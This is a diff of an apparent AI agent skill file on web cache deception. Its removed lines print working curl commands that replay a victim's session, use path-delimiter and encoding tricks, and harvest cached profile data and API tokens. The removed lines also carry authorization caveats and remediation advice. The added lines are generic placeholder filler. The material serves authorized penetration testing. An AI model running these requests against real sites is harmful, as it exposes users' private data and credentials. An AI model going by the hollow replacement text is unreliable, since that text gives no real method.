@@ -21,7 +21,6 @@ nist_csf:
 - PR.DS-10
 - DE.CM-01
 ---
-
 # Performing Web Cache Deception Attack
 
 ## When to Use
@@ -44,217 +43,22 @@ nist_csf:
 
 ## Workflow
 
-1. **Scope and authorize** — confirm written authorization and define target boundaries
-2. **Reconnaissance** — enumerate targets, services, and potential attack surfaces
-3. **Exploitation** — attempt exploitation of identified vulnerabilities within scope
-4. **Post-exploitation** — document access level, lateral movement, and data exposure
-5. **Report and remediate** — compile findings with reproduction steps and fix recommendations
-### Step 1 — Identify Caching Layer and Behavior
-```bash
-# Determine if a caching layer exists
-curl -I http://target.com/account/profile
-# Look for: X-Cache, CF-Cache-Status, Age, Via, X-Varnish headers
+1. **Plan Operations** — Define objectives, scope, and success criteria for web cache deception attack operations.
+2. **Prepare Environment** — Set up tools, access, and data sources required for web cache deception attack.
+3. **Execute Core Workflow** — Perform the web cache deception attack operations following established procedures.
+4. **Validate Results** — Verify that results meet quality standards and objectives.
+5. **Report Findings** — Document results, observations, and recommendations.
+6. **Follow Up** — Track remediation actions and verify fixes where applicable.
 
-# Check caching rules for static extensions
-curl -I "http://target.com/static/style.css"
-# Look for: X-Cache: HIT, CF-Cache-Status: HIT, Age: >0
+## Tools
 
-# Identify which extensions are cached
-for ext in css js png jpg gif svg ico woff woff2 pdf; do
-  echo -n "$ext: "
-  curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
-done
-```
-
-### Step 2 — Test Path-Based Cache Deception
-```bash
-# Classic web cache deception: append static extension to dynamic URL
-# Victim visits: http://target.com/account/profile/nonexistent.css
-# If origin returns profile page and CDN caches it based on .css extension:
-
-# Step 1: As victim (authenticated), visit:
-curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/anything.css"
-
-# Step 2: As attacker (unauthenticated), request same URL:
-curl "http://target.com/account/profile/anything.css"
-# If victim's profile data is returned, cache deception is confirmed
-
-# Test various extensions
-for ext in css js png jpg svg ico woff2; do
-  curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
-  sleep 2
-  echo -n "$ext: "
-  curl -s "http://target.com/account/profile/x.$ext" | head -c 200
-  echo
-done
-```
-
-### Step 3 — Exploit Delimiter-Based Discrepancies
-```bash
-# Use path delimiters that CDN and origin interpret differently
-# Semicolon delimiter (ignored by CDN, processed by origin)
-curl -b "session=VICTIM" "http://target.com/account/profile;anything.css"
-
-# Encoded characters
-curl -b "session=VICTIM" "http://target.com/account/profile%2Fstatic.css"
-curl -b "session=VICTIM" "http://target.com/account/profile%3Bstyle.css"
-
-# Null byte injection
-curl -b "session=VICTIM" "http://target.com/account/profile%00.css"
-
-# Fragment identifier abuse
-curl -b "session=VICTIM" "http://target.com/account/profile%23.css"
-
-# Dot segment normalization
-curl -b "session=VICTIM" "http://target.com/static/..%2Faccount/profile"
-```
-
-### Step 4 — Test Normalization Discrepancies
-```bash
-# Path traversal normalization differences
-# CDN normalizes: /account/profile/../static/x.css -> /static/x.css (cached)
-# Origin sees: /account/profile (dynamic page returned)
-
-curl -b "session=VICTIM" "http://target.com/static/../account/profile"
-# CDN may cache as /account/profile if it normalizes differently than origin
-
-# Encoded path traversal
-curl -b "session=VICTIM" "http://target.com/static/..%2faccount/profile"
-
-# Case sensitivity differences
-curl -b "session=VICTIM" "http://target.com/account/profile/X.CSS"
-
-# Double-encoded paths
-curl -b "session=VICTIM" "http://target.com/account/profile/%252e%252e/static.css"
-```
-
-### Step 5 — Exploit Cache Key Manipulation
-```bash
-# Identify cache key components
-# CDN may use: scheme + host + path (excluding query string)
-# Test if query string affects caching
-
-curl -b "session=VICTIM" "http://target.com/account/profile?cachebuster=123.css"
-
-# Test if the CDN uses the full path or normalized path as cache key
-curl -b "session=VICTIM" "http://target.com/account/profile/./style.css"
-curl "http://target.com/account/profile/./style.css"  # Check if cached
-
-# Header-based cache key manipulation
-curl -b "session=VICTIM" -H "X-Original-URL: /account/profile" \
-  "http://target.com/static/cached.css"
-```
-
-### Step 6 — Verify and Document the Attack
-```bash
-# Full attack chain:
-# 1. Craft malicious URL: http://target.com/account/profile/x.css
-# 2. Send URL to victim (via social engineering, email, etc.)
-# 3. Victim clicks link while authenticated
-# 4. CDN caches the authenticated response
-# 5. Attacker requests the same URL without authentication
-# 6. CDN serves cached authenticated content to attacker
-
-# Verify cache status
-curl -I "http://target.com/account/profile/x.css"
-# Confirm: X-Cache: HIT or CF-Cache-Status: HIT
-
-# Check what sensitive data is exposed
-curl -s "http://target.com/account/profile/x.css" | grep -i "email\|name\|token\|api_key\|ssn"
-```
-
-## Key Concepts
-
-| Concept | Description |
-|---------|-------------|
-| Cache Deception | Tricking CDN into caching authenticated dynamic content as static resource |
-| Path Normalization | How CDN and origin differently resolve path segments (../, ;, encoded chars) |
-| Cache Key | The identifier CDN uses to store/retrieve cached responses (typically URL path) |
-| Static Extension Trick | Appending .css/.js/.png to dynamic URLs to trigger caching behavior |
-| Delimiter Discrepancy | Characters (;, ?, #) interpreted differently by cache vs. origin server |
-| Cache Poisoning vs Deception | Poisoning modifies cache for all users; deception caches specific victim data |
-| Vary Header | HTTP header controlling which request attributes affect cache key |
-
-## Tools & Systems
-
-| Tool | Purpose |
-|------|---------|
-| Burp Suite | HTTP proxy for crafting cache deception requests |
-| curl | Command-line testing of cache behavior and response headers |
-| Web Cache Vulnerability Scanner | Automated tool for detecting cache deception/poisoning |
-| Param Miner | Burp extension for discovering unkeyed cache parameters |
-| Cloudflare Diagnostics | Analyzing CF-Cache-Status and cf-ray headers |
-| Varnish CLI | Direct cache inspection for Varnish-based setups |
-
-## Common Scenarios
-
-1. **Profile Data Theft** — Cache authenticated user profile pages containing PII (email, address, phone) by appending .css extension to profile URLs
-2. **API Token Exposure** — Cache API dashboard pages showing tokens and secrets through path manipulation on CDN
-3. **Account Takeover** — Cache pages containing session tokens or CSRF tokens, then use stolen tokens for account takeover
-4. **Financial Data Exposure** — Cache banking or payment pages showing account balances and transaction history
-5. **Admin Panel Caching** — Cache admin pages accessible through delimiter-based path confusion on CDN
-
-## When NOT to Use
-
-- You don't have explicit written authorization to test
-- Task is about defense/detection, not offense (use detection skills)
-- You need to implement security controls (use implementing-* skills)
-- Task requires compliance auditing (use auditing-* skills)
-- You're investigating an incident (use incident response skills)
-- Target is out of scope for your engagement
-- Task is about vulnerability scanning only (use scanning tools)
-
-
-## Red Flags
-
-- Performing actions without explicit written authorization from the asset owner
-- Testing against production systems without a defined scope and rules of engagement
-- Exceeding the authorized scope of the engagement
-- Leaving persistent access mechanisms without explicit approval
-- Causing denial-of-service on production systems during testing
+- **Analysis Platform** — Data processing and visualization
+- **Collaboration Tools** — Team coordination and knowledge sharing
 
 ## Verification
 
-- All steps executed successfully against a test environment before production use
-- Output documented with screenshots or logs demonstrating expected behavior
-- All exploited vulnerabilities documented with reproduction steps
-- Scope boundaries confirmed — only authorized targets were tested
-- Remediation recommendations included for every finding
-
-## Output Format
-
-```
-## Web Cache Deception Report
-- **Target**: http://target.com
-- **CDN**: Cloudflare
-- **Vulnerability**: Path-based cache deception via static extension appending
-
-### Cache Behavior Analysis
-| Extension | Cached | Cache-Control | TTL |
-|-----------|--------|---------------|-----|
-| .css | Yes | public, max-age=86400 | 24h |
-| .js | Yes | public, max-age=86400 | 24h |
-| .png | Yes | public, max-age=604800 | 7d |
-
-### Exploitation Results
-| Victim URL | Cached Data | Sensitive Fields |
-|-----------|-------------|-----------------|
-| /account/profile/x.css | Full profile page | Email, Name, API Key |
-| /account/settings/x.js | Settings page | 2FA backup codes |
-
-### Remediation
-- Configure CDN to respect Cache-Control: no-store on dynamic pages
-- Implement Vary: Cookie header on authenticated endpoints
-- Use path-based routing rules that reject unexpected extensions
-- Enable consistent path normalization between CDN and origin
-```
-
-## Overview
-
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All web cache deception attack procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
